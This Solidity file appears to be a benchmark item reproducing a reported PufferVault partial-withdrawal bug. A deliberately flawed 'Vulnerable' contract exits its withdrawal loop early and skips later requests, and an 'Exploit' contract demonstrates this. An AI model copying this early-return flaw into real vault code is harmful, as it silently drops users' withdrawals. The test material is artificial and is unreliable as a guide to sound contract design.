// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// AuditVault 38286: PufferVault partial withdrawal failure. Reduced local model preserves the reported state transition.

contract Vulnerable {
    uint256 public processed; function withdraw(uint256[] calldata requests) external { for (uint256 i; i < requests.length; ++i) { if (requests[i] == 2) return; processed++; } }
}

contract Exploit {
    Vulnerable public bug;
    bool public success;

    constructor() {
        bug = new Vulnerable();
    }

    function attack() external {
        uint256[] memory requests = new uint256[](3); requests[0] = 1; requests[1] = 2; requests[2] = 3; bug.withdraw(requests); success = bug.processed() == 1;
    }
}


